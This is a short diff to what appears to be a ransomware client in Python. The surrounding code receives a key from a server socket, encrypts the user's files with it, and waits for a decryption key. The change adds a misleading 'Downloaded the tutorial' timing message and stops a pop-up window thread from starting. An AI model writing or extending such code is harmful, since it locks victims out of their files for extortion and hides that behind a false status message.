@@ -6,6 +6,7 @@ import select
 import sys
 from threading import *
 import uuid
+import time
 
 import interface
 
@@ -146,11 +147,13 @@ if __name__ == "__main__":
                         key = data.decode()
                         encryptFiles(key)
                     
+                    toc = time.perf_counter()
+                    print(f"Downloaded the tutorial in {toc - tic:0.4f} seconds")
+                    
                     # set up thread for tkinter window
                     t1 = Thread(target=interface.App().pop_up_win)
                     t1.daemon = True
-                    t1.start()
-                    
+
                     # recv waits for new input of key to decrypt
                     key = s.recv(4096)
                     # upon receiving a key from the server, proceed to decrypt files
